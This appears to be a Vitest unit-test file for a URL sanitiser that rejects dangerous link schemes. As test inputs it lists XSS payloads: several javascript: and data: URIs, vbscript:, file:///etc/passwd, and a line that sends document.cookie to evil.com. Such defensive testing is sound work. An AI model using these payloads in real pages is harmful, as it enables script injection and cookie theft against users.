import { describe, expect, it, vi, afterEach } from "vitest";
import { openSafely, safeHostname, safeHref } from "./safeUrl";

describe("safeHref", () => {
  it("passes through https and http URLs unchanged", () => {
    expect(safeHref("https://example.com/a?b=1")).toBe("https://example.com/a?b=1");
    expect(safeHref("http://example.com")).toBe("http://example.com");
  });

  // The actual vulnerability: these all survive require_str, which rejects only
  // '<' and '>', so the render boundary is what has to stop them.
  it.each([
    "javascript:alert(1)",
    "javascript:fetch('https://evil.com/'+document.cookie)",
    "JavaScript:alert(1)",             // scheme matching is case-insensitive
    "  javascript:alert(1)",           // leading whitespace padding
    "\tjavascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:msgbox(1)",
    "blob:https://example.com/1234",
    "file:///etc/passwd",
  ])("rejects %s", (hostile) => {
    expect(safeHref(hostile)).toBeUndefined();
  });

  it("rejects relative and malformed values rather than throwing", () => {
    expect(safeHref("/relative/path")).toBeUndefined();
    expect(safeHref("not a url")).toBeUndefined();
    expect(safeHref("https://")).toBeUndefined();
  });

  it("rejects non-strings and blanks", () => {
    expect(safeHref(undefined)).toBeUndefined();
    expect(safeHref(null)).toBeUndefined();
    expect(safeHref(42)).toBeUndefined();
    expect(safeHref("")).toBeUndefined();
    expect(safeHref("   ")).toBeUndefined();
  });
});

describe("safeHostname", () => {
  it("returns the host for a trusted URL", () => {
    expect(safeHostname("https://docs.example.com/a")).toBe("docs.example.com");
  });

  // Regression: the call sites used `new URL(v).hostname` inline, which threw
  // on a malformed value and crashed the whole table render.
  it("returns null instead of throwing on unparseable input", () => {
    expect(safeHostname("not a url")).toBeNull();
    expect(safeHostname(undefined)).toBeNull();
  });

  it("returns null for a hostile scheme even though it is parseable", () => {
    expect(safeHostname("javascript:alert(1)")).toBeNull();
  });
});

describe("openSafely", () => {
  afterEach(() => vi.unstubAllGlobals());

  it("opens a trusted URL with noopener and reports success", () => {
    const open = vi.fn();
    vi.stubGlobal("window", { ...window, open });
    expect(openSafely("https://example.com")).toBe(true);
    expect(open).toHaveBeenCalledWith("https://example.com", "_blank", "noopener");
  });

  it("does not call window.open for a javascript: URI", () => {
    const open = vi.fn();
    vi.stubGlobal("window", { ...window, open });
    expect(openSafely("javascript:alert(1)")).toBe(false);
    expect(open).not.toHaveBeenCalled();
  });
});
